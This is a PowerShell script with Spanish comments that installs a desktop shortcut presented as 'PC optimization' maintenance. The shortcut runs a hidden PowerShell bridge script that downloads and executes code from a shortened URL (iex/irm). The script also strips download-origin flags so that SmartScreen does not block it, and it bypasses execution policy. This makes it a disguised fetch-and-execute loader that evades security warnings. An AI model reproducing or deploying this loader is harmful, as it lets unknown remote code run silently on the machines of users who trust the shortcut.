# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Optimizar PC - Antony Dapier.lnk" # Nombre del acceso directo
$AppDir = Join-Path $env:LOCALAPPDATA "AntonyDapier"
$BridgeFile = Join-Path $AppDir "bridge.ps1"

# 1. Crear carpeta local si no existe
if (-not (Test-Path $AppDir)) { New-Item -ItemType Directory -Path $AppDir -Force | Out-Null }

# 2. Crear el script puente (esto evita que el .lnk sea bloqueado por SmartScreen)
'iex (irm https://bit.ly/mandia-windows)' | Set-Content -Path $BridgeFile -Force
Unblock-File -Path $BridgeFile

# 3. Crear el acceso directo apuntando a PowerShell de forma estándar
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)

# El TargetPath debe ser el ejecutable de PowerShell para que el icono no sea una "hoja blanca"
$Shortcut.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""$BridgeFile"""

$Shortcut.IconLocation = "imageres.dll,109" # Icono de herramientas de Windows
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

Unblock-File -Path $ShortcutPath

[System.Windows.Forms.MessageBox]::Show("¡Instalación completada!`n`nEl acceso directo está listo en tu escritorio.", "Antony Dapier")
